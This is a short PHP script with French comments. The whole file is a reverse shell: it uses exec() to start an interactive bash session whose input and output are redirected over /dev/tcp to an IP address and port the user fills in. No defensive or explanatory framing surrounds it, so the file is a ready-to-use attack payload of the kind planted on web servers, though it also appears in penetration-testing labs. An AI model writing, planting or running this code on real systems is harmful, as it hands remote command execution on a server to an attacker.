<?php
$ip = '192.168.0.1';  // Remplacez par l'adresse IP de votre machine
$port = 1234;         // Remplacez par le port que vous avez configuré pour écouter

// Utilise la fonction exec pour exécuter une commande shell qui ouvre un shell interactif bash
// et redirige l'entrée, la sortie et l'erreur standard vers une connexion TCP à l'adresse IP et au port spécifiés
exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>